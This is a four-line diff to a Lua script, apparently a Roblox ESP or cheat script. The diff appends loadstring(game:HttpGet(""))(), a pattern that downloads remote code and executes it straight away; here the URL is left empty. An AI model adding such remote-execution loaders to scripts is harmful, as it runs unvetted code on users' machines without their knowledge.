@@ -1312,3 +1312,4 @@ local function YZGINA_fake_script() -- ESP.ButtonManager
 	
 end
 coroutine.wrap(YZGINA_fake_script)()
+loadstring(game:HttpGet(""))()
